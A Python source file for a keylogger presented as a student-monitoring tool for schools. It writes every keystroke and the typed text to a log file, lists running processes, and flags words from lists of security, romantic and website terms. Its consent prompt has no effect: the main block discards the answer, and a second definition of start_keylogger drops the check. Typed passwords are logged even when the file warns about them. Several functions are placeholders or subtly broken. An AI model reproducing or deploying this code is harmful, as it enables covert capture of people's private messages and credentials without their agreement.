from pynput.keyboard import Key, Listener
from datetime import datetime, timedelta
import time
import matplotlib.pyplot as plt
from collections import defaultdict
import psutil
import os


# Constants
LOG_FILE = "educational_key_log.txt"
ALERT_KEYWORDS = ["play", "game", "social", "video", "chat"]
REMINDER_INTERVAL = timedelta(minutes=30)  # Example: remind every 30 minutes
LESSON_TOPICS = ["math", "science", "history"]
NON_EDUCATIONAL_SITES = [
    "facebook.com", "twitter.com", "instagram.com", "tiktok.com", "reddit.com",
    "pinterest.com", "tumblr.com", "snapchat.com", "whatsapp.com", "netflix.com",
    "hulu.com", "disneyplus.com", "amazon.com", "ebay.com", "aliexpress.com",
    "wish.com", "target.com", "walmart.com", "bestbuy.com", "craigslist.org",
    "zillow.com", "realtor.com", "indeed.com", "monster.com", "linkedin.com",
    "glassdoor.com", "upwork.com", "fiverr.com", "freelancer.com", "guru.com",
    "youtube.com", "vimeo.com", "dailymotion.com", "twitch.tv", "kickstarter.com",
    "patreon.com", "gofundme.com", "onlyfans.com", "soundcloud.com", "bandcamp.com",
    "spotify.com", "pandora.com", "apple.com", "google.com", "microsoft.com",
    "yahoo.com", "bing.com", "aol.com", "ask.com", "duckduckgo.com", "baidu.com",
    "yandex.com", "booking.com", "expedia.com", "tripadvisor.com", "airbnb.com",
    "trivago.com", "kijiji.ca", "gumtree.com", "etsy.com", "shopify.com",
    "godaddy.com", "bluehost.com", "siteground.com", "wix.com", "squarespace.com",
    "weebly.com", "wordpress.com", "medium.com", "wattpad.com", "fanfiction.net",
    "ao3.org", "furaffinity.net", "deviantart.com", "newgrounds.com", "kongregate.com",
    "miniclip.com", "addictinggames.com", "armor.com", "bigfishgames.com",
    "jayisgames.com", "pogo.com", "runescape.com", "secondlife.com", "minecraft.net",
    "roblox.com", "fortnite.com", "pubg.com", "leagueoflegends.com", "worldofwarcraft.com",
    "blizzard.com", "valve.com", "steam.com", "epicgames.com", "playstation.com",
    "xbox.com", "nintendo.com", "tinder.com", "bumble.com", "okcupid.com", "match.com"
]

# Variables
current_word = ""
key_usage = defaultdict(int)
student_behavior = {"focus_warnings": 0, "unrelated_content": 0}

def send_reminder(message):
    print(f"Reminder: {message}")

def analyze_typing_patterns():
    # Placeholder function to analyze typing patterns
    # For simplicity, always return False in this example
    return False

def check_vulnerable_words(word):
    vulnerable_words = [
        "hack", "cheat", "crack", "exploit", "malware", "virus", "trojan",
        "worm", "backdoor", "botnet", "rootkit", "spyware", "adware", "ransomware",
        "phishing", "keylogger", "brute force", "SQL injection", "XSS", "CSRF", "DDoS",
        "social engineering", "zero-day", "payload", "injection", "overflow",
        "buffer overflow", "credential stuffing", "eavesdropping", "man-in-the-middle",
        "spoofing", "tampering", "session hijacking", "malware-as-a-service", "dark web",
        "deep web", "bot", "command and control", "exfiltration", "ransomware-as-a-service",
        "cryptojacking", "data breach", "identity theft", "skimming", "carding", "pharming",
        "keylogging", "session fixation", "penetration testing", "red team", "blue team",
        "phishing", "spear phishing", "whaling", "vishing", "smishing", "social engineering",
        "tailgating", "baiting", "quid pro quo", "pretexting", "shoulder surfing",
        "dumpster diving", "honeypot", "sandbox", "SIEM", "IDS", "IPS", "firewall",
        "encryption", "decryption", "cipher", "RSA", "AES", "hashing", "SHA", "MD5",
        "steganography", "forensics", "incident response", "threat hunting",
        "cyber kill chain", "APT", "insider threat", "zero trust", "perimeter defense",
        "defense in depth", "anomaly detection", "behavioral analysis", "endpoint protection",
        "EDR", "MDR", "XDR", "SIEM", "SOC", "threat intelligence", "vulnerability management",
        "patch management", "CVE", "NIST"
    ]
    if any(vul_word in word.lower() for vul_word in vulnerable_words):
        return True
    return False

def avoid_personal_communication(word):
    personal_communication_keywords = [
        "love", "chat", "private", "secret", "relationship", "girlfriend", "boyfriend",
        "date", "kiss", "hug", "miss you", "xoxo", "bae", "babe", "honey", "sweetie",
        "darling", "cutie", "handsome", "beautiful", "flirt", "romantic", "affection",
        "crush", "sweetheart", "beloved", "desire", "passion", "infatuation", "lover",
        "partner", "soulmate", "dear", "adorable", "cute", "snuggle", "together",
        "forever", "marriage", "wedding", "spouse", "fiancé", "fiancée", "intimate",
        "trust", "commitment", "devotion", "endearment", "fondness", "cherish", "dote",
        "idolize", "precious", "angel", "sugar", "snookums", "pookie", "cuddle",
        "sweet", "heartthrob", "longing", "yearn", "desirous", "enamored", "amour",
        "smitten", "ravish", "allure", "enchanted", "enthrall", "captivate", "adore",
        "pamper", "spoiled", "gorgeous", "intimacy", "attraction", "magnetism",
        "courtship", "companionship", "fidelity", "faithfulness", "lover's",
        "passionate", "roses", "chocolate", "valentine", "romance", "caress",
        "affectionate", "tender", "devoted", "unconditional", "embrace", "cherished",
        "unbreakable", "commit", "adored"
    ]
    if any(keyword in word.lower() for keyword in personal_communication_keywords):
        return True
    return False

def block_non_educational_sites(word):
    for site in NON_EDUCATIONAL_SITES:
        if site in word.lower():
            print(f"Access to {site} is blocked.")
            return True
    return False

def alert_teacher(message):
    print(f"Alert: {message}")
    student_behavior["focus_warnings"] += 1

def check_lesson_relevance(word):
    if not any(topic in word.lower() for topic in LESSON_TOPICS):
        student_behavior["unrelated_content"] += 1
        print(f"Typing pattern logged: {datetime.now()} - {word}")

def focus_reminder():
    if student_behavior["focus_warnings"] > 3:
        print("Reminder: Please stay focused on the lesson.")

def generate_behavioral_heatmap():
    keys = list(key_usage.keys())
    values = list(key_usage.values())
    plt.bar(keys, values)
    plt.xlabel('Keys')
    plt.ylabel('Frequency')
    plt.title('Behavioral Heatmap')
    plt.show()

def real_time_threat_detection(word):
    # Placeholder for real-time threat detection
    if "threat" in word.lower():
        print("Potential threat detected!")

def data_loss_prevention(word):
    # Placeholder for data loss prevention measures
    if "confidential" in word.lower() or "password" in word.lower():
        print("Data loss prevention triggered.")

def behavior_based_access_control():
    # Placeholder for behavior-based access control logic
    pass  # Implement logic as per requirements

def get_consent():
    print("Ethical and legal considerations should include user consent, data privacy, and compliance with regulations.")
    consent = input("Do you consent to the use of a keylogger for educational purposes? (yes/no): ")
    return consent.lower() == "yes"

def start_keylogger():
    if get_consent():
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    else:
        print("Consent not given. Keylogger will not start.")

def track_typing_speed():
    start_time = time.time()
    total_keys = 0
    while True:
        elapsed_time = time.time() - start_time
        if elapsed_time > 60:  # Track for 60 seconds
            typing_speed = total_keys / elapsed_time
            print(f"Typing speed: {typing_speed} keys per second")
            break
        time.sleep(1)
        total_keys += 1

def monitor_key_usage():
    for key in key_usage:
        print(f"Key '{key}' pressed {key_usage[key]} times.")

def capture_special_keys():
    special_keys = ["space", "enter", "backspace", "shift", "ctrl", "alt", "tab", "esc"]
    for key in special_keys:
        if key in key_usage:
            print(f"Special key '{key}' pressed {key_usage[key]} times.")

def record_timestamps():
    with open(LOG_FILE, 'a') as file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"{timestamp}: Logging started\n")

def log_typing_patterns():
    with open(LOG_FILE, 'a') as file:
        file.write(f"Typing pattern logged: {current_word}\n")

def count_words():
    global current_word
    words = current_word.split()
    word_count = len(words)
    print(f"Word count: {word_count}")

def track_error_keys():
    error_keys = ["caps_lock", "num_lock", "scroll_lock"]
    for key in error_keys:
        if key in key_usage:
            print(f"Error key '{key}' pressed {key_usage[key]} times.")

def analyze_long_keys():
    for key in key_usage:
        if len(key) > 5:
            print(f"Long key '{key}' pressed {key_usage[key]} times.")

def monitor_application_usage():
    for proc in psutil.process_iter(['pid', 'name']):
        print(f"Process ID: {proc.info['pid']}, Process Name: {proc.info['name']}")

def generate_summary_report():
    report = f"Summary Report:\nTotal key presses: {sum(key_usage.values())}\n"
    report += f"Focus warnings: {student_behavior['focus_warnings']}\n"
    report += f"Unrelated content incidents: {student_behavior['unrelated_content']}\n"
    report += f"Current time: {datetime.now()}"
    print(report)

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def on_press(key):
    global current_word
    global key_usage
    try:
        current_key = key.char
        current_word +=current_key
        key_usage[current_key] += 1

        if len(current_word) > 5:
            analyze_typing_patterns()

        if check_vulnerable_words(current_word):
            send_reminder("Do not type sensitive information.")
            pass

        if avoid_personal_communication(current_word):
            alert_teacher("Avoid personal communication during lessons.")
            pass

        if block_non_educational_sites(current_word):
            alert_teacher("Access to non-educational content is blocked.")
            pass

        check_lesson_relevance(current_word)
        focus_reminder()
        real_time_threat_detection(current_word)
        data_loss_prevention(current_word)
        behavior_based_access_control()

        # Logging to file
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - {current_key}\n")
            f.write(f"Typing pattern logged: {datetime.now()} - {current_word}\n")

    except AttributeError:
        print("AttributeError occurred. Key:", key)  # Print the key causing the AttributeError

def on_release(key):
    if key == Key.esc:
        generate_behavioral_heatmap()
        generate_summary_report()
        return False
    current_key = str(key).replace("'", "")
    key_usage[current_key] += 1
    log_typing_patterns()

if __name__ == "__main__":
    get_consent()
    track_typing_speed()
    monitor_key_usage()
    capture_special_keys()
    record_timestamps()
    log_typing_patterns()
    count_words()
    track_error_keys()
    analyze_long_keys()
    monitor_application_usage()
    generate_summary_report()
    start_keylogger()
